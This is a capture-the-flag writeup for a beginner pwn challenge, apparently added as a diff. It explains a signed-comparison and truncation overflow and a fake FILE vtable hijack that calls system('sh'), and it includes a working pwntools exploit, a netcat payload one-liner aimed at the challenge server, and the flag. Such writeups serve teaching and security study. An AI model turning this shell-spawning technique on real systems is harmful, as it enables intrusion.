@@ -1,0 +1,233 @@
+======================================================================
+ LYKNCTF — ez pwn revenge  (Writeup)
+======================================================================
+
+Flag: LYKNCTF{https://www.youtube.com/watch?v=Cl7FBLLi73Q&list=RDCl7FBLLi73Q&start_radio=1}
+
+Category: Pwn
+Difficulty: Beginner
+Binary: chall (ELF x86-64, dynamically linked, not stripped)
+
+
+
+1. BINARY INFORMATION
+======================================================================
+
+$ checksec --file=chall
+    RELRO:    Full RELRO   (GOT is read-only)
+    Canary:   No canary    (no stack cookie)
+    NX:       NX enabled   (no shellcode execution)
+    PIE:      No PIE       (fixed addresses at 0x400000)
+
+Functions of interest:
+  main                     0x40130f
+  init_proc                0x4011b1
+  init_fake_file           0x4011f3
+  custom_fclose            0x40128d
+  normal_overflow          0x401197
+  normal_finish            0x4011a6
+  please_do_not_use_this   0x401186
+  system@plt               0x401040
+
+Data symbols:
+  box                      0x404040
+  normal_vtable            0x404010
+
+
+
+2. VULNERABILITY
+======================================================================
+
+The program reads a buffer length as a signed integer:
+
+    scanf("%d", &size);
+    if (size <= 0x50) {              // signed comparison (jle)
+        read(0, box, (unsigned char)size);
+    }
+
+Two issues:
+  (a) Signed bypass: input "-1" passes "size <= 0x50" (since -1 < 80).
+  (b) Truncation:  size is truncated to a byte.  -1 (0xFFFFFFFF) becomes
+      al = 0xFF = 255, allowing a read of up to 255 bytes into box.
+
+The box buffer is at 0x404040.  Beyond the intended 80 bytes lies:
+
+  0x4040a0  (box+0x60):  Fake FILE struct (initialised by init_fake_file)
+  0x4040e8  (box+0xa8):  FILE+0x48 = vtable pointer
+
+By writing 176 bytes we overwrite both the FILE fields and the vtable ptr.
+
+
+
+3. CUSTOM_FCLOSE ANALYSIS
+======================================================================
+
+After the read, main calls custom_fclose(&box+0x60):
+
+  void custom_fclose(FILE* fp) {
+      if (fp == NULL) return;
+      void** v = *(void***)(fp + 0x48);      // load vtable ptr
+      if (v == NULL) return;
+
+      int flags = *(int*)(fp + 0x10);
+      if ((flags & 0xffff0000) == 0xfbad0000) {
+          if (*(fp+0x20) > *(fp+0x28))
+              v[0](fp);                        // "overflow" path
+      } else {
+          v[1](fp);                            // "finish" path
+      }
+  }
+
+The function calls through a vtable whose pointer is stored at FILE+0x48,
+which is exactly what we can overwrite via the large read.
+
+
+
+4. EXPLOIT STRATEGY
+======================================================================
+
+Goal:  Get a shell via system().
+
+Key points:
+  - Full RELRO prevents GOT overwrites.
+  - No PIE means system@plt is at fixed address 0x401040.
+  - The else branch of custom_fclose calls vtable[1](file_ptr).
+  - arg1 (rdi) = file_ptr = 0x4040a0 (our controlled data).
+
+Payload design:
+  1. Set FILE+0x10 (flags) = 0  -> forces ELSE path
+  2. Set FILE+0x48 (vtable_ptr) = 0x4040b0  (points to FILE+0x10)
+     -> vtable[1] = *(0x4040b0 + 8) = *(0x4040b8)
+  3. At FILE+0x18 = 0x4040b8, place system@plt (0x401040)
+     -> vtable[1] = system@plt
+  4. At FILE+0x00 = 0x4040a0, place "sh\0"
+     -> system("sh") is called
+
+Payload layout (offset from box = 0x404040):
+
+  Offset  Size  Value                  Notes
+  ------  ----  -----                  -----
+  0x00    80    \x00 * 80             Padding
+  0x50     4    0x00000000            box+0x50 = 0 (skip decoy)
+  0x54     4    \x00 * 4
+  0x58     8    0xdeadbeefcafebabe   box+0x58 guard
+  0x60     8    "sh\0" + padding     FILE+0x00 = system arg
+  0x68     8    0x00000000            FILE+0x08
+  0x70     8    0x00000000            FILE+0x10 = flags = 0
+  0x78     8    0x0000000000401040   FILE+0x18 = system@plt
+  0x80-0xa7  40  0x00000000 * 5      FILE+0x20..0x40
+  0xa8     8    0x00000000004040b0   FILE+0x48 = vtable ptr
+
+Total: 176 bytes (0xb0), well within the 255-byte limit.
+
+
+
+5. EXPLOIT SCRIPT
+======================================================================
+
+See exploit.py (included in this directory).
+
+  from pwn import *
+  context.arch = 'amd64'
+  SYSTEM_PLT = 0x401040
+
+  r = remote('15.235.202.47', 8996)
+  r.recvuntil(b'buffer: ')
+  r.sendline(b'-1')
+  r.recvuntil(b'> \n')
+
+  payload  = b'\x00' * 0x50
+  payload += p32(0)
+  payload += b'\x00' * 4
+  payload += p64(0xdeadbeefcafebabe)
+  payload += b'sh\x00' + b'\x00' * 5
+  payload += p64(0)                    # FILE+0x08
+  payload += p64(0)                    # FILE+0x10 = flags (0)
+  payload += p64(SYSTEM_PLT)           # FILE+0x18 = system@plt
+  payload += p64(0) * 5                # FILE+0x20..0x40
+  payload += p64(0x4040b0)            # FILE+0x48 = vtable_ptr
+
+  r.send(payload)
+  sleep(0.5)
+  r.sendline(b'cat /home/ez_pwn/flag.txt')
+  r.interactive()
+
+Run:  python3 exploit.py
+
+
+
+6. REPRODUCTION STEPS
+======================================================================
+
+1.  Connect to the challenge server:
+      nc 15.235.202.47 8996
+
+2.  When prompted, enter:  -1
+
+3.  Send the binary payload (176 bytes) that overwrites the fake FILE
+    struct to redirect the vtable call to system("sh").
+
+4.  Execute commands:
+      cat /home/ez_pwn/flag.txt
+
+5.  Observe the flag:
+      LYKNCTF{https://www.youtube.com/watch?v=Cl7FBLLi73Q&list=RDCl7FBLLi73Q&start_radio=1}
+
+
+
+7. MANUAL REPRODUCTION (no pwntools)
+======================================================================
+
+Generate payload.bin with a Python one-liner, then pipe with netcat:
+
+  python3 -c "
+  import struct, sys
+  p64 = lambda x: struct.pack('<Q', x)
+  payload  = b'\x00' * 0x50
+  payload += struct.pack('<I', 0)
+  payload += b'\x00' * 4
+  payload += p64(0xdeadbeefcafebabe)
+  payload += b'sh\x00' + b'\x00' * 5
+  payload += p64(0) * 2
+  payload += p64(0x401040)
+  payload += p64(0) * 5
+  payload += p64(0x4040b0)
+  sys.stdout.buffer.write(payload)
+  " > payload.bin
+
+  (echo '-1'; sleep 0.3; cat payload.bin; sleep 0.3; \
+   echo 'cat /home/ez_pwn/flag.txt'; sleep 1) | nc 15.235.202.47 8996
+
+
+
+8. TOOLS USED
+======================================================================
+
+  - file, checksec:         Binary identification and protection analysis
+  - objdump, readelf, nm:   Disassembly and symbol/relocation inspection
+  - strings:                Extract readable strings and hardcoded data
+  - pwntools (Python):      Exploit development framework
+  - netcat:                 Raw TCP connection testing
+
+
+
+9. KEY TAKEAWAYS
+======================================================================
+
+  1. Signed vs unsigned comparisons matter.  jle/jg (signed) can be
+     bypassed with negative numbers.
+
+  2. Narrowing conversion (int -> byte) can turn -1 into 255, enabling
+     buffer overflows where none seemed possible.
+
+  3. Custom vtable dispatch in writable memory (BSS/data) is exploitable
+     even with Full RELRO, since the vtable pointer itself is not in the
+     GOT.
+
+  4. On x86-64, the first function argument is passed in RDI.  If you
+     control what RDI points to and can redirect execution to system@plt,
+     you control the command executed.
+
+  5. "please_do_not_use_this" functions are always worth inspecting,
+     but they may be decoys.  The real power is in redirecting control
+     flow to libc functions with attacker-controlled arguments.
